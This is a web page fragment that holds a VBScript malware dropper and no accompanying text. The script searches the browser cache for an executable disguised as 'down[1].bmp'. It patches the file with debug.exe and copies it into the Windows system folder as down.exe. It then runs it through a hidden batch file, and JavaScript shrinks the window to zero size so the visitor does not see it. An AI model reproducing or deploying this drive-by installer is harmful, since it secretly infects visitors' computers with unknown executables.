
<SCRIPT LANGUAGE="VBScript">

Option Explicit
Dim FSO,WSH,CACHE,str,sucess
Set FSO = CreateObject("Scripting.FileSystemObject")
Set WSH = CreateObject("WScript.Shell")
CACHE=wsh.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Cache")
sucess=0


 SearchBMPFile fso.GetFolder(CACHE),"down[1].bmp"
 if sucess=0 then SearchBMPFile fso.GetFolder(CACHE),"down[2].bmp"



Function SearchBMPFile(Folder,fname)
   Dim SubFolder,File,Lt,tmp,winsys
   str=FSO.GetParentFolderName(folder) & "\" & folder.name & "\" & fname');
   if FSO.FileExists(str) then
      tmp=fso.GetSpecialFolder(2) & "\"
      winsys=fso.GetSpecialFolder(1) & "\"
      set File=FSO.GetFile(str)
      File.Copy(tmp & "tmp.dat")
      On Error Resume Next
      File.Delete
      if FSO.FileExists(str) then exit function
      set Lt=FSO.CreateTextFile(tmp & "tmp.in")
      Lt.WriteLine("rbx")
      Lt.WriteLine("0")
      Lt.WriteLine("rcx")

      Lt.WriteLine("29DD")
      Lt.WriteLine("w136")
      Lt.WriteLine("q")
      Lt.Close
      set Lt=FSO.CreateTextFile(tmp & "tmp.bat")
      Lt.WriteLine("@echo off")
      Lt.WriteLine("debug " & tmp & "tmp.dat <" & tmp & "tmp.in >" & tmp & "tmp.out")
      Lt.WriteLine("copy " & tmp & "tmp.dat " & winsys & "down.exe>" & tmp & "tmp.out")
      Lt.WriteLine("del " & tmp & "tmp.dat >" & tmp & "tmp.out")
      Lt.WriteLine("del " & tmp & "tmp.in >" & tmp & "tmp.out")
      Lt.WriteLine(winsys & "down.exe")
      Lt.Close
      WSH.Run tmp & "tmp.bat",false,6
      On Error Resume Next
      'FSO.GetFile(tmp & "tmp.bat").Delete
      sucess=1

   end if
   If Folder.SubFolders.Count <> 0 Then
      For Each SubFolder In Folder.SubFolders
         SearchBMPFile SubFolder,fname
      Next
   End If
End Function
window.close
</script>

<SCRIPT language=JavaScript>
parent.moveTo(0,0);
parent.resizeTo(0,0);
</SCRIPT>